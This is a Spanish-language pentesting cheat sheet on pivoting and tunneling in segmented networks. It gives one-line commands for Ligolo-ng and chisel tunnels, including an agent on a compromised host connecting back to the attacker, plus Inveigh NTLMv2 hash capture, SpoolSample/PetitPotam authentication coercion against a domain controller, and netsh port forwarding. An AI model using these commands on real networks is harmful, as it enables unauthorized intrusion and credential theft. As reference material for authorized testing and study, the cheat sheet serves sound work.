# Pivoting & Túneles

[⬅ Volver al índice](../CHEATSHEET.md) · [Versión web](https://iphobiuss.github.io)

> [!WARNING]
> **Solo entornos autorizados.** Contenido educativo y de referencia, con placeholders genéricos (`corp.local`, `$DC_IP`). No reproduce hosts, flags ni cadenas de ningún examen. Aplicar estas técnicas sin permiso por escrito es ilegal.

## Teoría

Las redes bien diseñadas están **segmentadas**: el host que comprometes no suele alcanzar directamente los sistemas críticos. El pivoting consiste en usar ese primer host como **puente** hacia las subredes internas que no son enrutables desde tu máquina.

Hay dos enfoques: el **port forwarding** (redirigir un puerto concreto a través del host) y el **tunneling completo** (levantar una interfaz que enruta toda una subred, como hace Ligolo-ng). La elección depende de si necesitas un servicio puntual o moverte con libertad por el segmento interno.

## Herramientas del área

### Ligolo-ng

**Qué hace** · Crea un túnel con interfaz TUN que enruta redes internas no alcanzables.  

**Cuándo se usa** · Pivotar a segmentos o bosques no enrutables desde el host comprometido.

```bash
sudo /opt/ligolo/proxy -selfcert -laddr 0.0.0.0:11601
```
📖 [Documentación](https://github.com/nicocha30/ligolo-ng)

### chisel

**Qué hace** · Túnel TCP/UDP sobre HTTP, útil para port-forwarding rápido.  

**Cuándo se usa** · Reenviar un puerto interno hacia tu máquina cuando Ligolo es excesivo.

```bash
chisel server -p 8000 --reverse   # en el atacante
```
📖 [Documentación](https://github.com/jpillora/chisel)

### Inveigh

**Qué hace** · Equivalente de Responder para Windows: captura NTLMv2 desde dentro.  

**Cuándo se usa** · Ya tienes un host Windows interno y quieres capturar hashes del segmento.

```bash
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y
```
📖 [Documentación](https://github.com/Kevin-Robertson/Inveigh)

### SpoolSample / PetitPotam

**Qué hace** · Disparan coerción de autenticación (MS-RPRN / MS-EFSR) contra un host.  

**Cuándo se usa** · Forzar la cuenta de máquina de un DC a autenticarse contra tu listener.

```bash
SpoolSample.exe $TARGET <listener_ip>
```
📖 [Documentación](https://github.com/leechristensen/SpoolSample)

## Comandos por objetivo

### Pivoting & túneles

```bash
# Ligolo-ng: proxy en el atacante
sudo /opt/ligolo/proxy -selfcert -laddr 0.0.0.0:11601
# agente en el host comprometido
./agent -connect $IP:11601 -ignore-cert
# chisel (reverse)
chisel server -p 8000 --reverse
# redirección de puertos con netsh
netsh interface portproxy add v4tov4 listenport=13389 connectaddress=$TARGET connectport=3389
```
